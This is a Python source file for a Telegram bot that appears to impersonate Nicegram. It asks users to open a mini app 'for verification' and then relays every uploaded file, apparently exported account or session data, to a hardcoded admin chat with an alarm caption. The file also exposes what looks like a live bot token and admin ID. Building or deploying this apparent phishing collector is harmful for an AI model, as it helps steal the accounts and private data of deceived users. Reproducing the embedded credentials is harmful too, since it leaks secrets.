import asyncio
import logging
import os  # <--- Нужно для чтения порта
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo, BufferedInputFile

# --- КОНФИГУРАЦИЯ ---
# Токен теперь лучше не хранить в коде, а в настройках сервера, но пока можно и тут
BOT_TOKEN = '8202878099:AAES9ybI0KKY9e_ixXrUMXtwqs-TL2r8nQg'
ADMIN_ID = 8187498719
WEB_APP_URL = "https://github.com/kareli123/nicegram"

# --- НАСТРОЙКИ СЕРВЕРА ---
# Render сам выдаст порт через переменную PORT
WEB_SERVER_HOST = "0.0.0.0"
WEB_SERVER_PORT = int(os.environ.get("PORT", 8080))  # <--- ВАЖНОЕ ИЗМЕНЕНИЕ

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- ВЕБ-СЕРВЕР ---
routes = web.RouteTableDef()


@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    reader = await request.multipart()
    field = await reader.next()
    user_id = None
    file_data = None
    filename = "unknown.json"

    while field:
        if field.name == 'user_id':
            val = await field.read_chunk()
            user_id = val.decode('utf-8')
        elif field.name == 'file':
            filename = field.filename or "data.json"
            file_data = await field.read()
        field = await reader.next()

    if user_id and file_data:
        try:
            await bot.send_document(
                chat_id=ADMIN_ID,
                document=BufferedInputFile(file_data, filename=filename),
                caption=f"🚨 Файл загружен (Mini App)!\nUser ID: {user_id}"
            )
            try:
                await bot.send_message(chat_id=int(user_id), text="✅ Файл принят.")
            except:
                pass
        except Exception as e:
            logging.error(f"Error sending to admin: {e}")

    return web.Response(text="OK", headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS"
    })


@routes.options('/upload')
async def handle_options(request):
    return web.Response(text="OK", headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type"
    })


# --- БОТ ---
TEXT_MAIN = "Откройте приложение для проверки."


def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))]
    ])


@router.message(Command("start"))
async def cmd_start(message: types.Message):
    # Убедитесь, что картинка тоже загружена на GitHub!
    try:
        photo = FSInputFile("nicegramm.jpg")
        await message.answer_photo(photo=photo, caption=TEXT_MAIN, reply_markup=get_main_keyboard())
    except:
        await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())


# --- ЗАПУСК ---
async def main():
    app = web.Application()
    app.add_routes(routes)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, WEB_SERVER_HOST, WEB_SERVER_PORT)
    await site.start()
    logging.info(f"Server running on port {WEB_SERVER_PORT}")

    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
